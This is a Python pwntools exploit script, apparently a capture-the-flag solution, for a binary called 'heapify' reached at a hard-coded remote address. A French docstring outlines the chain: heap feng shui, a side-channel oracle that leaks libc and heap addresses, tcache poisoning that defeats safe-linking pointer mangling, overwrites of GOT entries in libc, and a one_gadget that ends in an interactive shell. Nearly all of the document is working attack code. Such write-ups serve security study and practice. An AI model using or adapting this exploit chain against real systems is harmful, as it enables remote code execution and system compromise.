"""
Méthode : Heap Feng Shui → Oracle → Tcache poisoning → GOT overwrite

- Heap :
  Allocation/free cycles pour préparer heap layout
  Création small/large bins pour leaks

- Oracle memory leak :
  Bruteforce hex digit par digit via side-channel
  Leak libc via small bin
  Leak heap via tcache FD pointer

- Heap exploitation :
  Fake chunk creation avec size 0x71
  Tcache poisoning via FD pointer overwrite
  Obfuscation pointer : ptr ^ (addr >> 12)`

- GOT overwrite :
  Target __j_rawmemchr dans GOT
  Target strlen_xcvs2 dans GOT
  Write gadget 0x000000000002CD53 (pop rdi; ret)

- Payload :
  Overwrite multiple GOT entries
  Use one_gadget pour shell
  Bypass full RELRO via tcache poisoning
"""

from pwn import *

binary = ELF("./heapify")
libc = ELF("./libc.so.6")
io = remote("94.237.52.235", 53044)

def send(size, prio, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"command: ", str(size).encode())
    io.sendlineafter(b"priority: ", prio)
    io.sendlineafter(b"command: ", data)

def exec():
    io.sendlineafter(b"> ", b"2")
    return io.recvuntil(b"2. Execute a command")

for _ in range(8):
    send(48, b"5", b"w"*4)
for _ in range(8):
    exec()
send(10, b"0"*1023+b"1", b"j"*4)
for _ in range(7):
    send(48, b"5", b"w"*4)
send(48, b"-", b"")
for _ in range(8):
    exec()

def oracle(base):
    pos = 9
    while True:
        send(48, str(base).encode(), b"flag")
        if b"Congratulations" in exec():
            base += 0x1000000000000000
        else:
            if pos == 1:
                return base
            base -= 0x1000000000000000
            exec()
            pos -= 1
            base += 0x1000000000000000

leak = oracle(0x00007f0000000000)
libc.address = leak - 0x219d10

exec()
send(58, b"5", b"qqqq")
send(58, b"5", b"qqqq")
exec()
exec()
send(58, b"-", b"qqqq")

def oracle2(base):
    pos = 10
    while True:
        send(58, str(base).encode(), b"qqqq")
        if b"Congratulations" in exec():
            base += 0x1000000000000000
        else:
            if pos == 0:
                return base ^ (base >> 12)
            base -= 0x1000000000000000
            pos -= 1
            base += 0x1000000000000000

heap = oracle2(0x0000500000000000) - 0x6d0
exec()

for i in range(8):
    send(48, str(heap+0x1190+i).encode(), p64(0)*4+p64(0)[:-1] if i!=3 else p64(0)*5)

send(48, b"0", p64(0)*2)
send(48, b"-1", p64(0)*2)
send(8, b"-2", p64(0)[:-2])
send(58, b"-3", p64(0)*2)
send(58, b"-4", p64(0)*2)

p = -5
for i in range(50):
    p += 1
    send(48, str(p).encode(), b"v"*4 if i!=0x26 else p64(0)*2+p64(0x71)+p64(0))

for _ in range(39):
    exec()
for _ in range(7):
    send(48, b"-", b"")
exec()
exec()

payload = p64((libc.address+0x219020) ^ ((heap+0x1000) >> 12))
send(96, b"0", p64(0)*2+p64(0x41)+p64(0)*7+p64(0x41)+payload[:-1])
send(48, b"41", b"w"*4)
send(48, str(libc.address+0xebcf8).encode(), b"")

for _ in range(6):
    exec()

payload = p64((libc.address+0x219090) ^ ((heap+0x1000) >> 12))
send(96, b"0", p64(0)*2+p64(0x41)+p64(0)*7+p64(0x41)+payload[:-1])
send(48, b"-", b"")
send(48, b"-", b"")
send(48, b"0", p64(libc.address+0x000000000002CD53))

io.interactive()
